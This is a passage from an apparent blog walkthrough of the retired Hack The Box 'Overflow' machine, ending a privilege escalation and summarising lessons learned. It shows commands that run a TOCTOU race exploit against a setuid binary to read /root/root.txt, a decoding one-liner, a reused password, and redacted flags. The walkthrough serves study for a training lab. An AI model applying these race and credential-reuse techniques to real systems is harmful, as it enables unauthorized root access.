+<li>A symlink to <code>/root/root.txt</code> (3 seconds)</li>
+<li>A regular file containing "oops" (3 seconds)</li>
+</ul>
+<p><strong>Running the exploit:</strong></p>
+<pre><code class="language-bash" data-language="bash">cd /tmp/0xdf
+python3 /tmp/sploit.py /tmp/0xdf/l /tmp/0xdf/o | /opt/file_encrypt/file_encrypt
+</code></pre>
+<p>We ran this in a retry loop until it succeeded:</p>
+<pre><code class="language-bash" data-language="bash">while true; do
+    python3 /tmp/sploit.py /tmp/0xdf/l /tmp/0xdf/o | /opt/file_encrypt/file_encrypt
+    if [ -f /tmp/0xdf/o ]; then
+        echo "SUCCESS!"
+        break
+    fi
+    sleep 0.5
+done
+</code></pre>
+<p><strong>Decryption:</strong>
+The output file is XOR-encrypted with <code>0x9b</code>. We decrypted it:</p>
+<pre><code class="language-bash" data-language="bash">python3 -c "print(''.join([chr(0x9b^x) for x in open('/tmp/0xdf/o','rb').read()]))"
+</code></pre>
+<h3 id="hacker-mindset-11">Hacker Mindset</h3>
+<p><strong>Why does the PIN never change?</strong></p>
+<p>The developer forgot to call <code>srand()</code>. Without a seed, <code>rand()</code> always starts with seed <code>1</code>, producing the same sequence. This is a common C programming mistake. Always ask: <em>"What happens when randomness isn't random?"</em></p>
+<p><strong>Why is the PIN negative?</strong></p>
+<p><code>scanf("%i", &amp;user_pin)</code> reads a <strong>signed integer</strong>. The mathematical result <code>4091990840</code> has the high bit set (<code>0xf3e6d338</code>), so in two's complement it's <code>-202976456</code>. This is a subtle type conversion issue — the programmer expected a positive number but the attacker can input a negative one.</p>
+<p><strong>Why buffer overflow + return to encrypt?</strong></p>
+<p>We can't directly spawn a shell from the overflow because of NX (non-executable stack) and we don't have a libc leak for ROP. But we <strong>can</strong> redirect execution to an existing function: <code>encrypt</code>. This is called a <strong>return-to-function</strong> attack. The <code>encrypt</code> function gives us arbitrary file read as root (via the setuid bit).</p>
+<p><strong>Why TOCTOU works here:</strong></p>
+<p>The program checks file ownership at time T1, then opens the file at time T2. Between T1 and T2, the filesystem can change. By swapping a regular file for a symlink during the 3-second <code>sleep()</code>, we trick the program into opening a file it was explicitly told to reject.</p>
+<p><strong>Why XOR with 0x9b?</strong></p>
+<p>The <code>encrypt</code> function XORs every byte with <code>0x9b</code>. Since XOR is its own inverse, we decrypt by XORing again with the same key. This is a simple substitution cipher — easily reversible once you know the key.</p>
+<p><strong>Why use an auto-retry loop?</strong></p>
+<p>Race conditions are timing-dependent. Manual execution requires precise coordination. A retry loop automates the guesswork — eventually, the exploit will hit the window where <code>l</code> is a regular file during <code>stat()</code> and a symlink during <code>fopen()</code>.</p>
+<hr />
+<h2 id="final-flags">Final Flags</h2>
+<pre><code>user.txt:  82b44f[redacted]b4138d28
+root.txt:  be6a36[redacted]3edf12a0f
+</code></pre>
+<hr />
+<h2 id="lessons-learned-and-key-takeaways">Lessons Learned &amp; Key Takeaways</h2>
+<h3 id="1-cryptography-matters">1. Cryptography Matters</h3>
+<p>A single padding oracle vulnerability completely bypassed authentication. Encrypting something without integrity checks (MAC/HMAC) is dangerous.</p>
+<h3 id="2-defense-in-depth">2. Defense in Depth</h3>
+<p>The CMS hashes were salted, but the salt was stored in the same database. Once SQLi gave us the salt, the hashes fell to a simple dictionary attack.</p>
+<h3 id="3-supply-chain-tool-vulnerabilities">3. Supply Chain / Tool Vulnerabilities</h3>
+<p>CVE-2021-22204 wasn't in the web application itself — it was in <strong>ExifTool</strong>, a dependency. Always investigate what backend tools process user uploads.</p>
+<h3 id="4-credential-reuse-is-lethal">4. Credential Reuse is Lethal</h3>
+<p>One password (<code>sh@tim@n</code>) moved us from <code>www-data</code> → <code>developer</code>. Always try harvested credentials everywhere.</p>
+<h3 id="5-group-memberships-are-privileges">5. Group Memberships are Privileges</h3>
+<p>The <code>network</code> group seemed innocuous but granted write access to <code>/etc/hosts</code>. Always enumerate group memberships and find associated files.</p>
+<h3 id="6-race-conditions-are-real">6. Race Conditions are Real</h3>
+<p>The TOCTOU in <code>file_encrypt</code> is a classic concurrency bug. Any time you see a check followed by a delay followed by an action, think: <em>"Can I change the world between the check and the action?"</em></p>
+<h3 id="7-persistence-pays-off">7. Persistence Pays Off</h3>
+<p>None of these vulnerabilities were "easy." Each required:</p>
+<ul>
+<li>Careful observation (padding error message)</li>
+<li>Research (CMS hash algorithm, CVE-2021-22204)</li>
+<li>Tool mastery (padbuster, sqlmap, hashcat, gdb)</li>
+<li>Patience (the TOCTOU race required multiple attempts)</li>
+</ul>
+<p>The hacker mindset is not about finding one big vulnerability — it's about chaining small weaknesses into total compromise.</p>
+<hr />
+<p><strong>Happy Hacking!</strong> </p>
+8:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$d"}}]
+9:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing archive navigation","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-ophiuchi-walkthrough","children":[["$","span",null,{"children":"Newer article"}],["$","strong",null,{"children":"Hack The Box: Ophiuchi Walkthrough"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",114," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-overwatch-walkthrough","children":[["$","span",null,{"children":"Older article"}],["$","strong",null,{"children":"Hack The Box: Overwatch Walkthrough"}]]}]}]]}]
+a:["$","footer",null,{"className":"site-footer","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Security Researcher and Penetration Tester"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Public profiles","children":[["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Hack The Box",{"href":"https://app.hackthebox.com/public/users/349278","target":"_blank","rel":"noreferrer","children":["Hack The Box"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Credential wallet",{"href":"https://www.credential.net/profile/cyberkareem/wallet","target":"_blank","rel":"noreferrer","children":["Credential wallet"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Credly",{"href":"https://www.credly.com/users/cyberkareem/badges","target":"_blank","rel":"noreferrer","children":["Credly"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Evidence-led research · authorized assessment"}],["$","$L2",null,{"href":"/services","children":"Explore security services →"}]]}]]}]
+e:T528,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-overflow-walkthrough/#article","headline":"Hack The Box: Overflow Walkthrough","description":"An archived walkthrough of the retired Hack The Box Overflow machine, preserved from Abdullah Kareem's OSWE Prep preparation notes.","url":"https://cyberkareem.com/writing/hackthebox-overflow-walkthrough/","datePublished":"2026-06-11T12:21:01.000Z","dateModified":"2026-07-12T00:00:00.000Z","wordCount":3272,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/3e9b4c98ae2ff28e2557280be131c340ae1654ed/HTB-Overflow.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/writing/covers/hackthebox-overflow-walkthrough.webp","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-overflow-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Overflow Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-overflow-walkthrough/"}]}]}b:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$e"}}]
+c:["$","$Lf",null,{"children":["$","$10",null,{"name":"Next.MetadataOutlet","children":"$@11"}]}]
+11:null
